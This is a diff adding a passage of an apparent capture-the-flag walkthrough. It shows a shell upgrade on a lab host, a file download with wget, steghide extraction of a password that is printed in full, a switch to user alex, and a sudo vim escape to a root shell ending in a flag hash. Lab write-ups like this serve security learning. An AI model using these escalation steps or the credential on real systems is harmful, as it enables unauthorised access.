@@ -39,7 +39,64 @@ http://54.151.66.45/secret/tools/ping.php
 
 
 ```
+python3 -c 'import pty,os; pty.spawn("/bin/bash")'
+```
 
+
+<img width="665" height="117" alt="image" src="https://github.com/user-attachments/assets/fcee3f31-1c75-4c97-b9db-5ec05cd245d8" />
+
+```
+## on server
+python3 -m http.server 8888
+## on my kali
+wget http://54.151.66.45:8888/TrollFace.jpg
+```
+
+
+<img width="614" height="132" alt="image" src="https://github.com/user-attachments/assets/f753c363-a0f0-40a5-bd50-df43dd0eab26" />
+
+## user alex
+
+```
+steghide extract -sf TrollFace.jpg 
+```
+
+<img width="956" height="297" alt="image" src="https://github.com/user-attachments/assets/c5f5d0e0-0d68-4498-a74f-4e2978015be5" />
+
+
+```
+D0n41dTrump
+```
+
+
+```
+su alex
+```
+
+
+<img width="569" height="161" alt="image" src="https://github.com/user-attachments/assets/a7bbc294-c4c3-405c-9448-cef658fb0dcb" />
+
+
+```
+sudo -l
+```
+
+<img width="960" height="193" alt="image" src="https://github.com/user-attachments/assets/422eefaa-804b-463f-8bd6-0029dff3ad3d" />
+
+
+[gtfobins](https://gtfobins.github.io/gtfobins/vim/#sudo)
+
+
+
+```
+sudo vim -c ':!/bin/sh'
+```
+
+
+<img width="913" height="514" alt="image" src="https://github.com/user-attachments/assets/b82388d9-c60f-4ddb-87c8-020cb1f0a0ee" />
+
+```
+2afe5ca13f6aa7c615c05d9cceb6c23e
 ```
 
 
